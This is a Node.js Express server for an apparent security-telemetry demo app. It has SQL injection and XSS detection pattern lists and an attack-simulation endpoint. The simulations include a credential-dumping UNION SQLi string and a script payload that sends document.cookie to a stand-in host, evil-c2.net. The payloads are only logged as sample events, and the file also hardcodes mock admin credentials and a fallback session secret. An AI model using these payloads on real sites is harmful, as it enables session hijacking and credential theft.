require('dotenv').config();
const express = require('express');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const path = require('path');
const AegisScanClient = require('./aegis-sdk');

const app = express();
const PORT = process.env.PORT || 4000;

// Initialize AegisScan Telemetry SDK Client
const security = new AegisScanClient({
  endpoint: process.env.AEGISSCAN_ENDPOINT || 'http://localhost:3000',
  apiKey: process.env.AEGISSCAN_API_KEY || 'aeg_live_mock_key',
  appName: process.env.AEGISSCAN_APP_NAME || 'AegiDemo-Portal',
  environment: process.env.NODE_ENV || 'development'
});

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(session({
  secret: process.env.SESSION_SECRET || 'aegis_demo_secret_key_98765',
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: false, // set to true in HTTPS production
    maxAge: 1000 * 60 * 60 * 2 // 2 hours
  }
}));

// Configure View Engine & Static Assets
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.static(path.join(__dirname, 'public')));

// Helper to extract client IP
const getClientIp = (req) => {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
         req.socket.remoteAddress || 
         '127.0.0.1';
};

// Mock Credentials
const VALID_CREDENTIALS = {
  email: 'admin@company.com',
  password: 'SecretPassword123'
};

// Mock product catalog for search demo
const MOCK_PRODUCTS = [
  { id: 1, name: 'Aegis Sentinel Edge WAF', category: 'Infrastructure', price: '$499/mo', desc: 'Real-time adaptive edge firewall with automatic telemetry dispatch.' },
  { id: 2, name: 'Zero-Trust Bastion Host', category: 'Access Control', price: '$199/mo', desc: 'Ephemeral credentials and session-level posture verification.' },
  { id: 3, name: 'Cloud SIEM Telemetry Collector', category: 'Monitoring', price: '$349/mo', desc: 'Ultra-low latency event streaming for security operations centers.' },
  { id: 4, name: 'Quantum Cryptographic Key Vault', category: 'Encryption', price: '$899/mo', desc: 'Hardware-backed post-quantum key generation and rotation.' },
  { id: 5, name: 'Threat Hunting Agent v4', category: 'EDR', price: '$129/mo', desc: 'Autonomous kernel-level telemetry and anomaly mitigation.' }
];

// Attack signature patterns
const SQLI_PATTERNS = [
  /'\s*(?:or|and)\s*['"]?1['"]?\s*=\s*['"]?1/i,
  /union\s+select/i,
  /--/,
  /;\s*drop\s+table/i,
  /;\s*delete\s+from/i,
  /exec\s*\(/i,
  /sleep\(\d+\)/i,
  /benchmark\(\d+/i
];

const XSS_PATTERNS = [
  /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/i,
  /javascript:/i,
  /onerror\s*=/i,
  /onload\s*=/i,
  /<img[^>]+src=[^>]*>/i,
  /<svg[^>]+onload=[^>]*>/i,
  /eval\s*\(/i,
  /document\.cookie/i
];

/* ----------------------------------------------------
 * ROUTES
 * ---------------------------------------------------- */

// Main Dashboard view
app.get('/', (req, res) => {
  res.render('index', {
    user: req.session.user || null,
    config: {
      endpoint: security.endpoint,
      appName: security.appName,
      apiKeyMasked: security.apiKey ? security.apiKey.substring(0, 8) + '...' + security.apiKey.slice(-4) : 'Not configured',
      environment: security.environment
    }
  });
});

// Direct Login Route
app.get('/login', (req, res) => {
  if (req.session.user) {
    return res.redirect('/');
  }
  res.render('index', {
    user: null,
    activeTab: 'login',
    config: {
      endpoint: security.endpoint,
      appName: security.appName,
      apiKeyMasked: security.apiKey ? security.apiKey.substring(0, 8) + '...' + security.apiKey.slice(-4) : 'Not configured',
      environment: security.environment
    }
  });
});

// Admin Protected Route
app.get('/admin', async (req, res) => {
  const sourceIp = getClientIp(req);

  if (!req.session.user) {
    const telemetryResult = await security.unauthorizedAccess({
      userId: 'anonymous',
      sourceIp,
      endpoint: '/admin',
      metadata: { attemptedUrl: req.originalUrl, method: req.method }
    });

    return res.status(403).render('index', {
      user: null,
      activeTab: 'admin',
      adminAccessDenied: true,
      telemetryNotice: telemetryResult,
      config: {
        endpoint: security.endpoint,
        appName: security.appName,
        apiKeyMasked: security.apiKey ? security.apiKey.substring(0, 8) + '...' + security.apiKey.slice(-4) : 'Not configured',
        environment: security.environment
      }
    });
  }

  // Admin access verified
  const telemetryResult = await security.adminAccess({
    userId: req.session.user.email,
    sourceIp,
    endpoint: '/admin',
    metadata: { role: req.session.user.role }
  });

  res.render('index', {
    user: req.session.user,
    activeTab: 'admin',
    adminAccessDenied: false,
    telemetryNotice: telemetryResult,
    config: {
      endpoint: security.endpoint,
      appName: security.appName,
      apiKeyMasked: security.apiKey ? security.apiKey.substring(0, 8) + '...' + security.apiKey.slice(-4) : 'Not configured',
      environment: security.environment
    }
  });
});

/* ----------------------------------------------------
 * API ENDPOINTS
 * ---------------------------------------------------- */

// Authentication API: POST /api/login
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  const sourceIp = getClientIp(req);
  const userAgent = req.headers['user-agent'] || 'unknown';

  if (!email || !password) {
    return res.status(400).json({
      success: false,
      message: 'Email and password are required.'
    });
  }

  // Validate credentials
  if (email.toLowerCase() === VALID_CREDENTIALS.email.toLowerCase() && password === VALID_CREDENTIALS.password) {
    req.session.user = {
      email: VALID_CREDENTIALS.email,
      role: 'SUPER_ADMIN',
      authenticatedAt: new Date().toISOString()
    };

    const telemetry = await security.loginSuccess({
      userId: email,
      sourceIp,
      endpoint: '/api/login',
      metadata: { userAgent, authMethod: 'password' }
    });

    return res.json({
      success: true,
      message: 'Authentication successful. Administrative session granted.',
      user: req.session.user,
      telemetry
    });
  } else {
    const telemetry = await security.loginFailed({
      userId: email || 'unknown',
      sourceIp,
      endpoint: '/api/login',
      metadata: { attemptedEmail: email, userAgent, failureReason: 'Invalid password' }
    });

    return res.status(401).json({
      success: false,
      message: 'Invalid credentials. This event has been dispatched to AegisScan.',
      telemetry
    });
  }
});

// Logout API: POST /api/logout
app.post('/api/logout', (req, res) => {
  req.session.destroy(() => {
    res.json({ success: true, message: 'Session terminated.' });
  });
});

// Admin Data API: GET /api/admin/data
app.get('/api/admin/data', async (req, res) => {
  const sourceIp = getClientIp(req);

  if (!req.session.user) {
    const telemetry = await security.unauthorizedAccess({
      userId: 'anonymous',
      sourceIp,
      endpoint: '/api/admin/data',
      metadata: { attemptedResource: 'Sensitive Financial & Server Infrastructure Records' }
    });

    return res.status(403).json({
      success: false,
      error: 'UNAUTHORIZED_ACCESS',
      message: 'Access Denied: Administrative credentials missing. Telemetry dispatched.',
      telemetry
    });
  }

  const telemetry = await security.adminAccess({
    userId: req.session.user.email,
    sourceIp,
    endpoint: '/api/admin/data',
    metadata: { accessLevel: 'TIER_1_SUPERADMIN' }
  });

  return res.json({
    success: true,
    telemetry,
    data: {
      serverMetrics: {
        uptime: '99.99%',
        activeNodes: 12,
        loadAverage: '0.42, 0.38, 0.31',
        threatLevel: 'NOMINAL (AEGIS SCAN ACTIVE)'
      },
      infrastructureKeys: [
        { name: 'KUBERNETES_CLUSTER_SECRET', fingerprint: 'SHA256:7a8b...3f9c', rotated: '2 hours ago' },
        { name: 'PRIMARY_DATABASE_URI', fingerprint: 'postgresql://aegis_master:***@db.internal:5432', rotated: '1 day ago' },
        { name: 'STRIPE_WEBHOOK_SECRET', fingerprint: 'whsec_***9b12', rotated: '12 days ago' }
      ]
    }
  });
});

// Search API with SQLi and XSS Signature Inspection: POST /api/search
app.post('/api/search', async (req, res) => {
  const { query = '' } = req.body;
  const sourceIp = getClientIp(req);
  const userId = req.session.user ? req.session.user.email : 'anonymous';

  let detectedThreat = null;

  // Check for SQL Injection signatures
  for (const pattern of SQLI_PATTERNS) {
    if (pattern.test(query)) {
      detectedThreat = {
        type: 'SQL_INJECTION',
        pattern: pattern.toString(),
        sample: query
      };
      break;
    }
  }

  // Check for XSS signatures
  if (!detectedThreat) {
    for (const pattern of XSS_PATTERNS) {
      if (pattern.test(query)) {
        detectedThreat = {
          type: 'CROSS_SITE_SCRIPTING_XSS',
          pattern: pattern.toString(),
          sample: query
        };
        break;
      }
    }
  }

  if (detectedThreat) {
    let telemetry;
    if (detectedThreat.type === 'SQL_INJECTION') {
      telemetry = await security.sqliDetected({
        userId,
        sourceIp,
        endpoint: '/api/search',
        metadata: {
          attackVector: detectedThreat.type,
          detectedPattern: detectedThreat.pattern,
          inputPayload: query.length > 200 ? query.substring(0, 200) + '...' : query
        }
      });
    } else if (detectedThreat.type === 'CROSS_SITE_SCRIPTING_XSS') {
      telemetry = await security.xssDetected({
        userId,
        sourceIp,
        endpoint: '/api/search',
        metadata: {
          attackVector: detectedThreat.type,
          detectedPattern: detectedThreat.pattern,
          inputPayload: query.length > 200 ? query.substring(0, 200) + '...' : query
        }
      });
    } else {
      telemetry = await security.suspiciousRequest({
        userId,
        sourceIp,
        endpoint: '/api/search',
        metadata: {
          attackVector: detectedThreat.type,
          detectedPattern: detectedThreat.pattern,
          inputPayload: query.length > 200 ? query.substring(0, 200) + '...' : query
        }
      });
    }

    return res.status(400).json({
      success: false,
      threatDetected: true,
      threatType: detectedThreat.type,
      message: `[SECURITY INTERCEPT] Threat signature detected in search query (${detectedThreat.type}). Request quarantined.`,
      telemetry
    });
  }

  // Normal search filtering
  const qLower = query.toLowerCase();
  const results = MOCK_PRODUCTS.filter(p => 
    p.name.toLowerCase().includes(qLower) || 
    p.category.toLowerCase().includes(qLower) || 
    p.desc.toLowerCase().includes(qLower)
  );

  return res.json({
    success: true,
    threatDetected: false,
    query,
    count: results.length,
    results
  });
});

// Attack Simulation API: POST /api/simulate/:attackType
app.post('/api/simulate/:attackType', async (req, res) => {
  const { attackType } = req.params;
  const sourceIp = getClientIp(req);

  switch (attackType) {
    case 'brute-force': {
      const simulatedUsers = [
        'admin@company.com',
        'root@company.com',
        'administrator@company.com',
        'devops@company.com',
        'secops@company.com',
        'admin@company.com'
      ];
      
      const results = [];
      for (let i = 0; i < simulatedUsers.length; i++) {
        const email = simulatedUsers[i];
        const resTele = await security.loginFailed({
          userId: email,
          sourceIp: `198.51.100.${Math.floor(Math.random() * 200) + 10}`,
          endpoint: '/api/login',
          metadata: {
            simulation: true,
            burstSequence: `${i + 1}/6`,
            passwordAttempt: '********',
            threatCategory: 'CREDENTIAL_STUFFING_BRUTE_FORCE'
          }
        });
        results.push(resTele);
      }

      return res.json({
        success: true,
        simulation: 'Brute Force Attack (6 rapid failed logins)',
        dispatchedCount: results.length,
        events: results
      });
    }

    case 'sqli': {
      const maliciousPayload = "' OR '1'='1' UNION SELECT username, password_hash, token FROM auth_users --";
      const telemetry = await security.sqliDetected({
        userId: 'attacker_script_v2',
        sourceIp: '203.0.113.88',
        endpoint: '/api/search',
        metadata: {
          simulation: true,
          injectionType: 'UNION_BASED_SQLI',
          targetParam: 'query',
          payload: maliciousPayload
        }
      });

      return res.json({
        success: true,
        simulation: 'SQL Injection Probe',
        dispatchedCount: 1,
        events: [telemetry]
      });
    }

    case 'unauthorized': {
      const telemetry = await security.unauthorizedAccess({
        userId: 'anonymous_scanner',
        sourceIp: '192.0.2.144',
        endpoint: '/api/admin/financial-records',
        metadata: {
          simulation: true,
          probeType: 'BROKEN_OBJECT_LEVEL_AUTH (BOLA)',
          headerAuth: 'Bearer null'
        }
      });

      return res.json({
        success: true,
        simulation: 'Unauthorized Protected Access Attempt',
        dispatchedCount: 1,
        events: [telemetry]
      });
    }

    case 'rate-limit': {
      const burstResults = [];
      const burstIp = '198.51.100.42';
      for (let i = 1; i <= 10; i++) {
        const resTele = await security.rateLimitBurst({
          userId: 'bot_scraped_ip',
          sourceIp: burstIp,
          endpoint: '/api/products/catalog',
          metadata: {
            simulation: true,
            reqNumber: i,
            reqPerSecond: 45,
            actionTaken: 'HTTP 429 Too Many Requests'
          }
        });
        burstResults.push(resTele);
      }

      return res.json({
        success: true,
        simulation: 'Rate Limit Burst Flood (10 rapid requests)',
        dispatchedCount: burstResults.length,
        events: burstResults
      });
    }

    case 'xss': {
      const maliciousScript = "<script>fetch('https://evil-c2.net/exfil?c='+document.cookie)</script>";
      const telemetry = await security.xssDetected({
        userId: 'anonymous_xss_probe',
        sourceIp: '185.220.101.5',
        endpoint: '/api/search',
        metadata: {
          simulation: true,
          injectionType: 'STORED_REFLECTED_XSS',
          payload: maliciousScript
        }
      });

      return res.json({
        success: true,
        simulation: 'Cross-Site Scripting (XSS) Attack Attempt',
        dispatchedCount: 1,
        events: [telemetry]
      });
    }

    default:
      return res.status(400).json({ success: false, message: 'Unknown simulation type' });
  }
});

// Telemetry API: GET /api/telemetry/events
app.get('/api/telemetry/events', (req, res) => {
  res.json({
    success: true,
    count: security.getRecentEvents().length,
    events: security.getRecentEvents()
  });
});

// Telemetry API: DELETE /api/telemetry/events
app.delete('/api/telemetry/events', (req, res) => {
  security.clearEvents();
  res.json({ success: true, message: 'Telemetry event log cleared.' });
});

// Current User State API
app.get('/api/session', (req, res) => {
  res.json({
    authenticated: !!req.session.user,
    user: req.session.user || null
  });
});

// Start Server
app.listen(PORT, () => {
  console.log(`
  ======================================================
  🛡️  AEGISSCAN TELEMETRY DEMO APP RUNNING
  ======================================================
  ▶ Web UI:            http://localhost:${PORT}
  ▶ Login Page:        http://localhost:${PORT}/login
  ▶ Admin Portal:      http://localhost:${PORT}/admin
  ▶ AegisScan Remote:  ${security.endpoint}
  ▶ SDK Mode:          ${security.environment.toUpperCase()}
  ======================================================
  Mock Admin Credentials:
    Email:    admin@company.com
    Password: SecretPassword123
  ======================================================
  `);
});
